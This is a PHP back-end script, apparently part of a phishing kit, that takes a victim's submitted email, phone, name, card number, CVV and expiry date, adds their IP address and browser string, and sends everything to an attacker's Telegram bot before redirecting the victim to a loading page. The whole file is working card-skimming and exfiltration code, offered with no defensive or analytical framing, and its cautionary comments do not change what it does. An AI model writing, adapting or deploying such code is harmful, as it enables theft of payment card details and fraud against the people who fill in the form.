<?php
$zabi = getenv("REMOTE_ADDR");
$msg = "--++-----[ ☠️ 💚🚨|FRAG 💳 L7WAY |🚨💚 ☠️ ]-----++--\n";
$msg .= "Email🏛: " . $_POST['email'] . "\n";
$msg .= "Phone🔄: " . $_POST['phone'] . "\n";
$msg .= "Full Name🔑: " . $_POST['fullName'] . "\n";
$msg .= "Card Number🚨: " . $_POST['cardNumber'] . "\n"; // Be cautious with handling real card numbers
$msg .= "CVV🤡 : " . $_POST['cvv'] . "\n"; // Be cautious with handling CVV
$msg .= "Expiry Date🔍: " . $_POST['cardExpiry'] . "\n";
$msg .= "-------------- IP Infos ------------\n";
$msg .= "IP: $zabi\n";
$msg .= "BROWSER: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
$msg .= "----------------------☠️  🖕🤡🖕  ☠️----------------------\n";

include 'config.php'; // Ensure you have this file with appropriate configuration

// Ensure you have defined $token and $data appropriately in your config.php
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

header("Location: ./xapp"); // Redirect to loading page
?>